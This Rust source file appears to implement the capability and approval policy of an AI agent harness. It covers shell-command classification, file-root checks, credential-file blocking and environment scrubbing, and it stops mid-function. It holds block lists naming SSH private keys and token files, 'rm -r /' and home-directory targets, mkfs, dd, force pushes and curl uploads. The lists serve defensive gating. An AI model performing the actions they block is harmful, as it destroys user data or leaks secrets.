//! Capability policy for model-reachable effects. File tools check canonical paths, protect harness configuration, and
//! reject credential files. Shell commands keep approval checks, a scrubbed environment and process cleanup, and on
//! Linux the same file roots through Landlock (`confinement`, `crate::confine`). Network isolation is external.
use crate::eventlog::EventLog;
use anyhow::{bail, Result};
use serde_json::json;
use std::sync::Arc;
use serde::Deserialize;
use std::path::{Component, Path, PathBuf};

#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct PolicyFile {
    #[serde(default)]
    fs: FsSection,
    #[serde(default)]
    approval: ApprovalSection,
    #[serde(default)]
    budget: BudgetSection,
    #[serde(default)]
    packs: PacksSection,
}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct PacksSection {
    #[serde(default)]
    enable: Vec<String>,
}

/// `[budget]`: unknown keys are an error, so a removed or misspelled limit cannot silently run unlimited. Every other
/// section (and the file's top level) refuses unknown keys too.
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct BudgetSection {
    max_tokens: Option<u64>,
    max_wall_secs: Option<f64>,
}

/// Limits for one run, shared with every subagent. None = unlimited. Tokens are input + cache reads + cache writes + output.
#[derive(Deserialize, serde::Serialize, Default, Clone, Debug, PartialEq)]
pub struct Budget {
    pub max_tokens: Option<u64>,
    pub max_wall_secs: Option<f64>,
}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct ApprovalSection {
    /// extra command substrings that count as external effects (need approval)
    #[serde(default)]
    ask: Vec<String>,
    /// commands the USER pre-approves (substring match; an irreversible command needs an exact full-command match)
    #[serde(default)]
    allow: Vec<String>,
    mode: Option<ApprovalMode>,
}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct FsSection {
    #[serde(default)]
    read: Vec<String>,
    #[serde(default)]
    write: Vec<String>,
}
/// What happens to a command that needs approval and is not pre-approved in `policy.toml`.
#[derive(Clone, Copy, Debug, PartialEq, serde::Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ApprovalMode {
    /// Refuse it without asking.
    Deny,
    /// Ask on the terminal.
    Prompt,
}

impl std::str::FromStr for ApprovalMode {
    type Err = anyhow::Error;
    fn from_str(s: &str) -> Result<Self> {
        match s {
            "deny" => Ok(Self::Deny),
            "prompt" => Ok(Self::Prompt),
            _ => anyhow::bail!("approval mode must be deny or prompt (got {s:?})"),
        }
    }
}

/// The live policy: the frozen settings a run's manifest records, plus its journal.
pub struct Policy {
    cfg: Snapshot,
    pub log: Arc<EventLog>,
    grants: std::sync::Mutex<Vec<PathGrant>>,
    /// Files and directories hidden from children, by (device, inode), with where each was last seen: a child may move
    /// or hard-link a hidden file it cannot read, and the next command's ruleset must still hide it.
    hidden: std::sync::Mutex<std::collections::BTreeMap<(u64, u64), PathBuf>>,
    prompt: tokio::sync::Mutex<()>,
    /// An autoresearch worker's claim and best score, when `episode` is set.
    pub ar_progress: std::sync::Mutex<crate::ar::Progress>,
}

impl std::ops::Deref for Policy {
    type Target = Snapshot;
    fn deref(&self) -> &Snapshot { &self.cfg }
}

#[derive(Clone, Debug, serde::Serialize, Deserialize)]
pub struct Snapshot {
    #[serde(default)]
    pub autopilot: bool,
    pub workspace: PathBuf,
    pub tmp: PathBuf,
    pub read_roots: Vec<PathBuf>,
    pub write_roots: Vec<PathBuf>,
    pub protected: Vec<PathBuf>,
    /// Owner state the model may neither read nor write (autoresearch held-out results and snapshots), in any mode.
    #[serde(default)]
    pub sealed: Vec<PathBuf>,
    /// The autoresearch episode this run serves (`ar.*`), recorded with the rest of the frozen policy.
    #[serde(default)]
    pub episode: Option<crate::ar::Episode>,
    pub ask: Vec<String>,
    pub allow: Vec<String>,
    pub mode: ApprovalMode,
    pub budget: Budget,
    pub packs: Vec<String>,
}

/// What `Policy::approve` returns: who approved a request. Journaled with each shell command's outcome.
pub const APPROVAL_SOURCES: &[&str] = &["not-required", "policy-allow", "auto", "prompt"];

#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub enum Class {
    Read,
    LocalWrite,
    External,
    Irreversible,
}

impl Class {
    pub fn name(self) -> &'static str {
        match self {
            Class::Read => "read",
            Class::LocalWrite => "local_write",
            Class::External => "external",
            Class::Irreversible => "irreversible",
        }
    }
}

/// Commands that reach outside the machine, as a program followed by subcommand words (in order, options between them
/// skipped). Matched on shell words, not substrings. This drives the approval prompt; it is not a guard: an arbitrary
/// shell command can reach the network without naming any of these.
const EXTERNAL: &[&[&str]] = &[&["git", "push"], &["npm", "publish"], &["cargo", "publish"], &["twine", "upload"], &["docker", "push"],
    &["ssh"], &["scp"], &["rsync"], &["kubectl", "apply"], &["kubectl", "delete"], &["terraform", "apply"], &["gh", "pr", "create"],
    &["gh", "release"], &["aws"], &["gcloud"], &["sendmail"]];
/// `curl` methods that send data.
const CURL_WRITES: &[&str] = &["POST", "PUT", "PATCH", "DELETE"];
/// `git push` arguments that rewrite or delete remote history.
const PUSH_DESTRUCTIVE: &[&str] = &["--force", "--force-with-lease", "--force-if-includes", "--delete", "--mirror", "--prune"];
/// `rm -r` targets that are the whole filesystem or home directory.
const RM_ROOTS: &[&str] = &["/", "/*", "~", "~/", "~/*", "$HOME", "$HOME/", "$HOME/*", "${HOME}", "${HOME}/", "${HOME}/*"];
/// Programs that run the rest of their words as a command.
const WRAPPERS: &[&str] = &["sudo", "env", "command", "exec", "nohup", "time", "nice", "xargs", "timeout", "doas"];

const SYSTEM_READ: &[&str] = &["/usr", "/bin", "/sbin", "/etc", "/dev", "/opt"];
/// Credential files blocked by file tools, even inside an allowed read root.
const SECRET_FILES: &[&str] = &["credentials", "credentials.toml", "secrets.toml", ".netrc", ".npmrc", ".pypirc", "id_rsa", "id_ed25519"];

/// Is `path` (by file name) one of the credential files in SECRET_FILES?
pub fn is_secret(path: &Path) -> bool {
    path.file_name().and_then(|n| n.to_str()).is_some_and(|n| SECRET_FILES.contains(&n))
}

const ENV_ALLOW: &[&str] = &["PATH", "LANG", "LC_ALL", "LC_CTYPE", "TERM", "USER", "LOGNAME", "SHELL"];
const TOOLS: &[&str] = &["python3", "python", "pip3", "node", "npm", "npx", "git", "cargo", "rustc", "go", "uv", "ruby", "java", "make", "gcc", "clang", "deno", "bun"];

/// Split a shell command line into its simple commands, each a list of words. POSIX-ish: single and double quotes,
/// backslash escapes, comments, the operators `; & | ( )` and newlines between commands, and redirections. The bodies
/// of `$(...)` and backticks become commands of their own. It does not expand variables or aliases.
fn commands(line: &str) -> Vec<Vec<String>> {
    fn body(chars: &[char], mut i: usize, close: char) -> (String, usize) {
        // From just after `$(` or a backtick to its matching close; returns the body and the index after the close.
        let (mut depth, mut out) = (0usize, String::new());
        while i < chars.len() {
            let c = chars[i];
            if c == '\\' && i + 1 < chars.len() { out.push(c); out.push(chars[i + 1]); i += 2; continue; }
            if close == ')' && c == '(' { depth += 1; }
            if c == close { if depth == 0 { return (out, i + 1); } depth -= 1; }
            out.push(c);
            i += 1;
        }
        (out, i)
    }
    let chars: Vec<char> = line.chars().collect();
    let (mut cmds, mut cur, mut word): (Vec<Vec<String>>, Vec<String>, Option<String>) = (vec![], vec![], None);
    let end_word = |cur: &mut Vec<String>, word: &mut Option<String>| if let Some(w) = word.take() { cur.push(w); };
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            ' ' | '\t' => end_word(&mut cur, &mut word),
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                end_word(&mut cur, &mut word);
                if !cur.is_empty() { cmds.push(std::mem::take(&mut cur)); }
            },
            '<' | '>' => {
                end_word(&mut cur, &mut word);
                if chars.get(i + 1) == Some(&'&') { i += 1; } // `>&2` duplicates a descriptor; it ends no command
            },
            '#' if word.is_none() => { while i < chars.len() && chars[i] != '\n' { i += 1; } continue; },
            '\'' => {
                let w = word.get_or_insert_with(String::new);
                i += 1;
                while i < chars.len() && chars[i] != '\'' { w.push(chars[i]); i += 1; }
            },
            '"' => {
                word.get_or_insert_with(String::new);
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    match chars[i] {
                        '\\' if i + 1 < chars.len() && matches!(chars[i + 1], '"' | '\\' | '$' | '`') => { word.as_mut().unwrap().push(chars[i + 1]); i += 2; },
                        '$' if chars.get(i + 1) == Some(&'(') => { let (b, next) = body(&chars, i + 2, ')'); cmds.extend(commands(&b)); i = next; },
                        '`' => { let (b, next) = body(&chars, i + 1, '`'); cmds.extend(commands(&b)); i = next; },
                        ch => { word.as_mut().unwrap().push(ch); i += 1; },
                    }
                }
            },
            '\\' => {
                if let Some(&next) = chars.get(i + 1) {
                    if next != '\n' { word.get_or_insert_with(String::new).push(next); }
                    i += 1;
                }
            },
            '$' if chars.get(i + 1) == Some(&'(') => { let (b, next) = body(&chars, i + 2, ')'); cmds.extend(commands(&b)); i = next; continue; },
            '`' => { let (b, next) = body(&chars, i + 1, '`'); cmds.extend(commands(&b)); i = next; continue; },
            ch => word.get_or_insert_with(String::new).push(ch),
        }
        i += 1;
    }
    end_word(&mut cur, &mut word);
    if !cur.is_empty() { cmds.push(cur); }
    cmds
}

/// The effect class of one simple command (its words, as `commands` splits them).
fn class_of(words: &[String]) -> Class {
    // Skip variable assignments and wrappers (`sudo`, `env X=1`, `timeout 5`) to the program that actually runs.
    let mut i = 0;
    while i < words.len() {
        let w = words[i].as_str();
        let assignment = w.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
        if assignment || w.starts_with('-') || (i > 0 && WRAPPERS.contains(&words[i - 1].as_str()) && w.parse::<f64>().is_ok()) {
            i += 1;
        } else if WRAPPERS.contains(&program(w)) {
            i += 1;
        } else {
            break;
        }
    }
    let Some(first) = words.get(i) else { return Class::LocalWrite };
    let (prog, args) = (program(first), &words[i + 1..]);
    match prog {
        "bash" | "sh" | "zsh" | "dash" | "ksh" => {
            // `bash -c 'script'` runs its script; `bash -lc` too.
            let script = args.iter().position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c')).and_then(|p| args.get(p + 1));
            return script.map(|s| commands(s).iter().map(|c| class_of(c)).max().unwrap_or(Class::LocalWrite)).unwrap_or(Class::LocalWrite);
        },
        "eval" => return commands(&args.join(" ")).iter().map(|c| class_of(c)).max().unwrap_or(Class::LocalWrite),
        "mkfs" => return Class::Irreversible,
        p if p.starts_with("mkfs.") => return Class::Irreversible,
        "dd" if args.iter().any(|a| a.starts_with("if=") || a.starts_with("of=")) => return Class::Irreversible,
        "rm" => {
            let recursive = args.iter().any(|a| a == "--recursive" || (a.starts_with('-') && !a.starts_with("--") && (a.contains('r') || a.contains('R'))));
            let root = args.iter().any(|a| RM_ROOTS.contains(&a.as_str()) || a.trim_end_matches('/').is_empty() && a.starts_with('/'));
            return if recursive && root { Class::Irreversible } else { Class::LocalWrite };
        },
        "git" => {
            // `git -C dir -c k=v push ...`: options that take a value come before the subcommand.
            let mut j = 0;
            while j < args.len() && args[j].starts_with('-') { j += if matches!(args[j].as_str(), "-C" | "-c") { 2 } else { 1 }; }
            if args.get(j).map(String::as_str) == Some("push") {
                let destructive = args[j + 1..].iter().any(|a| PUSH_DESTRUCTIVE.iter().any(|d| a == d || a.starts_with(&format!("{d}=")))
                    || (a.starts_with('-') && !a.starts_with("--") && (a.contains('f') || a.contains('d')))
                    || ((a.starts_with('+') || a.starts_with(':')) && a.len() > 1));
                return if destructive { Class::Irreversible } else { Class::External };
            }
            return Class::LocalWrite;
        },
        "curl" => {
            let method = args.iter().enumerate().find_map(|(k, a)| {
                if a == "-X" || a == "--request" { args.get(k + 1).cloned() }
                else { a.strip_prefix("--request=").or_else(|| a.strip_prefix("-X")).filter(|m| !m.is_empty()).map(String::from) }
            });
            let sends = args.iter().any(|a| matches!(a.as_str(), "-d" | "--data" | "--data-raw" | "--data-binary" | "--data-urlencode" | "-F" | "--form" | "-T" | "--upload-file"));
            return if sends || method.is_some_and(|m| CURL_WRITES.contains(&m.to_ascii_uppercase().as_str())) { Class::External } else { Class::LocalWrite };
        },
        _ => {},
    }
    let external = EXTERNAL.iter().any(|pattern| {
        // The subcommand words appear in order among the arguments, options and their values in between.
        pattern[0] == prog && {
            let mut rest = args.iter();
            pattern[1..].iter().all(|want| rest.any(|a| a == want))
        }
    });
    if external { Class::External } else { Class::LocalWrite }
}

/// A command word's program name: `/usr/bin/git` is `git`.
fn program(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn canon(p: impl AsRef<Path>) -> Option<PathBuf> {
    std::fs::canonicalize(p).ok()
}

/// Lexically normalize an absolute path (resolve `.` and `..` without touching the filesystem).
fn normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

#[derive(Clone, Debug, serde::Serialize, Deserialize)]
struct PathGrant {
    path: PathBuf,
    recursive: bool,
    write: bool,
}

#[derive(Debug)]
struct OutsideRoots { path: PathBuf, write: bool }
impl std::fmt::Display for OutsideRoots {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "policy: {} {} is outside the allowed roots", if self.write { "writing" } else { "reading" }, self.path.display())
    }
}
impl std::error::Error for OutsideRoots {}

/// Read only the owner's controlling terminal. Nonblocking IO lets cancellation/deadlines close it immediately.
async fn ask(question: &str) -> Result<bool> {
    use std::io::{Read, Write};
    use std::os::unix::fs::OpenOptionsExt;
    let tty = std::fs::OpenOptions::new().read(true).write(true).custom_flags(libc::O_NONBLOCK)
        .open("/dev/tty").map_err(|_| anyhow::anyhow!("no controlling terminal; configure policy.toml or use --yes"))?;
    let mut tty = tty;
    writeln!(tty, "\n[approval needed] {question}\napprove? [y/N] ")?;
    let mut answer = Vec::new();
    loop {
        let mut buf = [0; 256];
        match tty.read(&mut buf) {
            Ok(0) => return Ok(false),
            Ok(n) => {
                answer.extend_from_slice(&buf[..n]);
                if answer.contains(&b'\n') || answer.len() > 256 {
                    return Ok(matches!(String::from_utf8_lossy(&answer).trim(), "y" | "Y" | "yes"));
                }
            },
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                tokio::time::sleep(std::time::Duration::from_millis(25)).await;
            },
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {},
            Err(e) => return Err(e.into()),
        }
    }
}

impl Policy {
    /// `autopilot` is the launching user's `--yes`: automatically approve ordinary requests.
    /// Canonical paths, credentials, sealed state and protected configuration are checked in every mode.
    pub fn new(workspace: &Path, autopilot: bool, approval_mode: Option<ApprovalMode>, resume: Option<&Path>, episode: Option<crate::ar::Episode>) -> Result<Policy> {
        let workspace = std::fs::canonicalize(workspace)?;
        if let Some(path) = resume {
            // Lock before reading any recovery state or repairing the log. Mutable workspace configuration is never
            // consulted for a resumed run: the exact authority approved at launch is part of its manifest.
            let log = EventLog::reopen(path)?;
            let manifest = crate::supervisor::Manifest::load(path)?;
            anyhow::ensure!(manifest.policy.workspace == workspace, "resume workspace differs from the saved run");
            let mut p = manifest.policy;
            validate_scratch(&p.tmp)?;
            std::fs::create_dir_all(&p.tmp)?;
            // A journal may have been moved since launch. Its actual files and artifacts remain read-only to file tools.
            let actual = std::fs::canonicalize(path)?;
            p.protected.extend([actual.clone(), actual.with_extension("lock"), actual.with_extension("revoked"),
                actual.parent().unwrap().join("blobs"), actual.parent().unwrap().join("registry")]);
            // Newly introduced aliases must not turn frozen protected paths into writable paths.
            let aliases: Vec<_> = p.protected.iter().filter_map(canon).collect();
            p.protected.extend(aliases);
            // The orchestrator retries an episode as a new child and never resumes one; a stale episode must not get `ar`.
            anyhow::ensure!(p.episode.is_none(), "this run was an autoresearch episode; continue the search with `hx run --ar --resume .harness/ar/RUN`");
            log.check()?;
            if crate::confine::status().is_err() {
                log.write("confinement", json!({"confinement": crate::confine::describe()}), true)?;
            }
            let grants = crate::eventlog::load(path)?.iter().filter(|r| r["kind"] == "path_grant")
                .map(|r| serde_json::from_value(r["grant"].clone())).collect::<std::result::Result<Vec<PathGrant>, _>>()?;
            return Ok(Policy { cfg: p, log, grants: grants.into(), hidden: Default::default(), prompt: Default::default(), ar_progress: Default::default() });
        }
        let modules_sha = crate::eventlog::sha_bytes(&serde_json::to_vec(crate::modules::EMBEDDED)?);
        let tmp = std::env::temp_dir().join(format!("hx-{}-{}", std::process::id(), std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH)?.subsec_nanos()));
        std::fs::create_dir_all(&tmp)?;
        let tmp = std::fs::canonicalize(tmp)?;
        let mut p = Snapshot { autopilot, workspace: workspace.clone(), tmp: tmp.clone(), read_roots: vec![], write_roots: vec![], protected: vec![], sealed: vec![], episode: None, ask: vec![], allow: vec![], mode: ApprovalMode::Prompt, budget: Budget::default(), packs: vec![] };
        p.read_roots.extend([workspace.clone(), tmp.clone()]);
        p.write_roots.extend([workspace.clone(), tmp]);
        p.protected.extend([workspace.join(".harness"), workspace.join("hx.lock")]);
        p.sealed.push(workspace.join(".harness/ar"));
        if let Some(e) = &episode { p.sealed.extend(crate::ar::sealed(e)); }
        p.episode = episode;
        for r in SYSTEM_READ {
            if let Some(c) = canon(r) {
                p.read_roots.push(c);
            }
        }
        p.read_roots.extend(toolchain_roots());
        // the trust store must never be writable by the model, even if the user's write roots cover ~/.config
        if let Some(d) = crate::trust::store_dir_canonical() {
            p.protected.push(d);
        }
        // check_write resolves aliases before comparing. Protect the resolved configuration too, including an
        // untrusted workspace's symlinked .harness or hx.lock including automatically approved path requests.
        let canonical_protected: Vec<_> = p.protected.iter().filter_map(canon).collect();
        p.protected.extend(canonical_protected);
        let canonical_sealed: Vec<_> = p.sealed.iter().filter_map(canon).collect();
        p.sealed.extend(canonical_sealed);
        let trusted = crate::trust::is_trusted(&workspace);
        if let Some(t) = std::fs::read_to_string(workspace.join(".harness/policy.toml")).ok().filter(|_| trusted) {
            let f: PolicyFile = toml::from_str(&t).map_err(|e| anyhow::anyhow!("bad .harness/policy.toml: {e}"))?;
            p.read_roots.extend(f.fs.read.iter().filter_map(canon));
            let w: Vec<PathBuf> = f.fs.write.iter().filter_map(canon).collect();
            p.read_roots.extend(w.clone());
            p.write_roots.extend(w);
            p.budget = Budget { max_tokens: f.budget.max_tokens, max_wall_secs: f.budget.max_wall_secs };
            p.packs = f.packs.enable;
            p.ask = f.approval.ask;
            p.allow = f.approval.allow;
            if let Some(m) = f.approval.mode {
                p.mode = m;
            }
        }
        if let Some(m) = approval_mode {
            p.mode = m; // the launching user's choice beats the file
        }
        // Approved skills may live outside the workspace (~/.agents/skills); their files must be readable (read-only).
        for pk in crate::modules::Resolver::new(workspace.clone()).list_packages() {
            if pk.kind == "skill" && !pk.dir.is_empty() {
                p.read_roots.push(PathBuf::from(pk.dir));
            }
        }
        // Automatic approval never disables the audit log.
        let log = EventLog::open(&workspace.join(".harness/log"))?;
        log.write("session", json!({"workspace": workspace.to_string_lossy(), "tmp": p.tmp.to_string_lossy(), "autopilot": autopilot,
            "approval_mode": p.mode, "config_sha": crate::trust::config_hash(&workspace), "trusted": trusted, "modules_sha": modules_sha,
            "confinement": crate::confine::describe()}), true)?;
        p.read_roots.sort();
        p.read_roots.dedup();
        let ar_progress = crate::ar::Progress::start(p.episode.as_ref()).into();
        Ok(Policy { cfg: p, log, grants: Default::default(), hidden: Default::default(), prompt: Default::default(), ar_progress })
    }

    pub fn snapshot(&self) -> Snapshot { self.cfg.clone() }

    /// What a child process (`sh`, a local MCP server) may touch, from the current policy and the grants approved so
    /// far: the read roots minus credentials, sealed owner state and the trust store; the write roots. Built per spawn,
    /// so a grant approved mid-run applies to later commands. Protected configuration inside a write root stays
    /// writable by children: Landlock cannot carve a hole in a writable tree without breaking file creation in it.
    pub fn confinement(&self) -> crate::confine::Rules {
        let (mut read, mut write) = (self.read_roots.clone(), self.write_roots.clone());
        for g in self.grants.lock().unwrap().iter() {
            read.push(g.path.clone());
            if g.write { write.push(g.path.clone()); }
        }
        let mut hidden = self.sealed.clone();
        hidden.push(self.workspace.join(".harness/secrets.toml"));
        hidden.extend(crate::trust::store_dir_canonical());
        hidden.extend(self.track_hidden(&hidden, &write));
        crate::confine::Rules { read, write, hidden }.with_system()
    }

    /// Where the hidden files seen so far are now. A file moved away from its hidden path, or given a second name by a
    /// hard link, is found again by its inode under the write roots (the only places a child can put it).
    fn track_hidden(&self, paths: &[PathBuf], write_roots: &[PathBuf]) -> Vec<PathBuf> {
        use std::os::unix::fs::MetadataExt;
        let mut seen = self.hidden.lock().unwrap();
        let mut linked = false;
        for p in paths {
            if let Ok(m) = std::fs::symlink_metadata(p) {
                seen.insert((m.dev(), m.ino()), p.clone());
                linked |= !m.is_dir() && m.nlink() > 1;
            }
        }
        let moved = seen.iter().any(|(&(dev, ino), p)| !std::fs::symlink_metadata(p).is_ok_and(|m| (m.dev(), m.ino()) == (dev, ino)));
        if !moved && !linked { return seen.values().cloned().collect(); }
        let mut found = vec![];
        fn walk(dir: &Path, seen: &std::collections::BTreeMap<(u64, u64), PathBuf>, found: &mut Vec<(u64, u64, PathBuf)>) {
            let Ok(entries) = std::fs::read_dir(dir) else { return };
            for entry in entries.flatten() {
                let Ok(m) = std::fs::symlink_metadata(entry.path()) else { continue };
                if seen.contains_key(&(m.dev(), m.ino())) { found.push((m.dev(), m.ino(), entry.path())); }
                if m.is_dir() { walk(&entry.path(), seen, found); }
            }
        }
        for root in write_roots { walk(root, &seen, &mut found); }
        let mut out: Vec<PathBuf> = found.iter().map(|(_, _, p)| p.clone()).collect();
        // Keep one known place per inode; an inode found nowhere was deleted.
        seen.retain(|key, _| found.iter().any(|(d, i, _)| (*d, *i) == *key) || paths.iter().any(|p| std::fs::symlink_metadata(p).is_ok_and(|m| (m.dev(), m.ino()) == *key)));
        for (dev, ino, p) in found { seen.insert((dev, ino), p); }
        out.extend(seen.values().cloned());
        out
    }

    /// Effect class of a shell command: the highest class of its simple commands.
    pub fn classify_sh(&self, cmd: &str) -> Class {
        self.segments(cmd).into_iter().map(|(_, c)| c).max().unwrap_or(Class::LocalWrite)
            .max(if self.ask.iter().any(|p| cmd.contains(p.as_str())) { Class::External } else { Class::LocalWrite })
    }

    /// Each simple command of `cmd` (words joined by single spaces) with its effect class.
    fn segments(&self, cmd: &str) -> Vec<(String, Class)> {
        commands(cmd).into_iter().map(|words| {
            let text = words.join(" ");
            let class = class_of(&words).max(if self.ask.iter().any(|p| text.contains(p.as_str())) { Class::External } else { Class::LocalWrite });
            (text, class)
        }).collect()
    }

    /// The approval gate. Returns the approval source ("not-required", "policy-allow", "auto" or "prompt"), or the
    /// reason it was refused. The run's approval settings are frozen in Rust; Luau code and hooks cannot change them.
    /// `--yes` approves external requests but never an irreversible one: that needs an exact `allow` entry or the
    /// owner's answer on the terminal.
    pub async fn approve(&self, cmd: &str, class: Class) -> std::result::Result<&'static str, String> {
        if matches!(class, Class::Read | Class::LocalWrite) { return Ok("not-required"); }
        if class == Class::Irreversible {
            if self.allow.iter().any(|a| a.trim() == cmd.trim()) { return Ok("policy-allow"); }
        } else if self.autopilot {
            return Ok("auto");
        } else if self.allowed(cmd) {
            return Ok("policy-allow");
        }
        if self.mode == ApprovalMode::Prompt {
            let _guard = self.prompt.lock().await;
            return match ask(&format!("{} command:\n  {cmd}", class.name())).await {
                Ok(true) => Ok("prompt"),
                Ok(false) => Err("the user declined; it was NOT run".into()),
                Err(_) if class == Class::Irreversible => Err("this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible commands; add the exact command to [approval] allow)".into()),
                Err(e) => Err(e.to_string()),
            };
        }
        let how = if class == Class::Irreversible { "add the exact command to [approval] allow or use --approval prompt" } else { "set [approval] allow, use --approval prompt, or launch with --yes" };
        Err(format!("this is an {} effect and needs the user's approval; it was NOT run ({how})", class.name()))
    }

    /// An external request is pre-approved when an `allow` entry covers each of its external simple commands, so an
    /// entry for one command cannot approve another chained after it. A request that is not a shell command (an MCP or
    /// HTTP label) is matched as a whole.
    fn allowed(&self, cmd: &str) -> bool {
        let covered = |text: &str| self.allow.iter().any(|a| text.contains(a.as_str()));
        let external: Vec<_> = self.segments(cmd).into_iter().filter(|(_, c)| *c >= Class::External).collect();
        if external.is_empty() { covered(cmd) } else { external.iter().all(|(text, _)| covered(text)) }
    }

    /// Request an ordinary missing path permission. Call only after principal/stage authorization.
    /// Grants are shared by descendants and journaled before use, so resume restores the same permissions.
    pub async fn authorize_path(&self, path: &str, write: bool) -> Result<()> {
        let check = || if write { self.check_write(path) } else { self.check_read(path) };
        let denied = match check() { Ok(_) => return Ok(()), Err(e) => e };
        if !denied.is::<OutsideRoots>() { return Err(denied); }
        let _guard = self.prompt.lock().await;
        let denied = match check() { Ok(_) => return Ok(()), Err(e) => e };
        let Some(outside) = denied.downcast_ref::<OutsideRoots>() else { return Err(denied) };
        let grant = PathGrant {
            path: if write { outside.path.parent().unwrap_or(&outside.path).to_path_buf() } else { outside.path.clone() },
            recursive: write || outside.path.is_dir(), write,
        };
        let source = if self.autopilot { "auto" } else {
            if self.mode == ApprovalMode::Deny { return Err(denied); }
            let access = if write { "read/write" } else { "read" };
            match ask(&format!("allow {access} access to {} for this run? (requested {path})", grant.path.display())).await {
                Ok(true) => "prompt",
                Ok(false) => bail!("approval_required: {denied}; the user declined"),
                Err(e) => bail!("approval_required: {denied}; {e}"),
            }
        };
        // Log before publishing a grant. Cancellation cannot grant unrecorded authority.
        self.log.write("path_grant", json!({"grant": grant, "source": source}), true)?;
        self.grants.lock().unwrap().push(grant);
        check()?;
        Ok(())
    }

    fn granted(&self, path: &Path, write: bool) -> bool {
        self.grants.lock().unwrap().iter().any(|g| (!write || g.write)
            && ((g.recursive && path.starts_with(&g.path)) || (path == g.path && !path.is_dir())))
    }

    pub fn is_sealed(&self, path: &Path) -> bool {
        Self::within(path, &self.sealed)
    }

    fn within(path: &Path, roots: &[PathBuf]) -> bool {
        roots.iter().any(|r| path.starts_with(r))
    }

    /// Resolve `p` (relative to the workspace) for reading; the canonical path must be inside a read root.
    pub fn check_read(&self, p: &str) -> Result<PathBuf> {
        let full = self.abs(p);
        if self.is_sealed(&normalize(&full)) || std::fs::canonicalize(&full).is_ok_and(|c| self.is_sealed(&c)) {
            bail!("policy: {p} is sealed owner state and cannot be read");
        }
        let c = std::fs::canonicalize(&full).map_err(|e| anyhow::anyhow!("{p}: {e}"))?;
        if is_secret(&c) {
            bail!("policy: {p} is a credential file and cannot be read");
        }
        if !Self::within(&c, &self.read_roots) && !self.granted(&c, false) {
            return Err(OutsideRoots { path: c, write: false }.into());
        }
        Ok(c)
    }

    /// Resolve `p` for writing: lexically normalized, no symlink anywhere on the not-yet-existing tail or at the
    /// target, existing ancestor canonicalized, result inside a write root and outside every protected path.
    pub fn check_write(&self, p: &str) -> Result<PathBuf> {
        let full = normalize(&self.abs(p));
        let mut existing = full.clone();
        let mut tail: Vec<std::ffi::OsString> = vec![];
        while std::fs::symlink_metadata(&existing).is_err() {
            match (existing.file_name().map(|n| n.to_os_string()), existing.parent().map(|x| x.to_path_buf())) {
                (Some(n), Some(par)) => {
                    tail.push(n);
                    existing = par;
                }
                _ => bail!("policy: cannot resolve {p}"),
            }
        }
        if tail.is_empty() && std::fs::symlink_metadata(&existing)?.file_type().is_symlink() {
            bail!("policy: refusing to write through the symlink {p}");
        }
        let mut c = std::fs::canonicalize(&existing)?;
        for t in tail.iter().rev() {
            c.push(t);
        }
        if self.is_sealed(&full) || self.is_sealed(&c) {
            bail!("policy: {p} is sealed owner state and cannot be written");
        }
        if Self::within(&c, &self.protected) {
            bail!("policy: {p} is protected (harness configuration cannot be modified by the model)");
        }
        if !Self::within(&c, &self.write_roots) && !self.granted(&c, true) {
            return Err(OutsideRoots { path: c, write: true }.into());
        }
        Ok(c)
    }

    pub fn abs(&self, p: &str) -> PathBuf {
        let p = Path::new(p);
        if p.is_absolute() { p.to_path_buf() } else { self.workspace.join(p) }
    }

    /// Environment passed to `sh`: a small allowlist, HOME and TMPDIR pointing at the run's temp dir. No API keys.
    pub fn env(&self) -> Vec<(String, String)> {
        let mut v: Vec<(String, String)> = ENV_ALLOW.iter().filter_map(|k| std::env::var(k).ok().map(|x| (k.to_string(), x))).collect();
        let t = self.tmp.to_string_lossy().to_string();
        v.push(("HOME".into(), t.clone()));
        v.push(("TMPDIR".into(), t));
        // HOME is the temp dir, so rustup/cargo would not find the user's toolchain; point them at the real (readable) dirs.
        let home = std::env::var("HOME").unwrap_or_default();
        for (var, dir) in [("RUSTUP_HOME", ".rustup"), ("CARGO_HOME", ".cargo")] {
            let val = std::env::var(var).ok().or_else(|| canon(Path::new(&home).join(dir)).map(|p| p.to_string_lossy().to_string()));
            if let Some(val) = val {
                v.push((var.into(), val));
            }
        }
        v
    }

}

/// The system and toolchain directories every child may read (autoresearch evaluators, which have no run policy).
pub fn system_read_roots() -> Vec<PathBuf> {
    SYSTEM_READ.iter().filter_map(canon).chain(toolchain_roots()).collect()
}

/// A logged path is not authority to remove arbitrary directories on shutdown. Scratch paths must be direct,
/// non-symlink children of this user's system temp directory with the exact name generated by Policy::new.
fn validate_scratch(path: &Path) -> Result<()> {
    let base = std::fs::canonicalize(std::env::temp_dir())?;
    let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
    let valid_name = name.strip_prefix("hx-").and_then(|s| s.split_once('-')).is_some_and(|(pid, nanos)| {
        !pid.is_empty() && !nanos.is_empty() && pid.bytes().all(|b| b.is_ascii_digit()) && nanos.bytes().all(|b| b.is_ascii_digit())
            && pid.parse::<u32>().is_ok_and(|p| p > 0) && nanos.parse::<u32>().is_ok_and(|n| n < 1_000_000_000)
    });
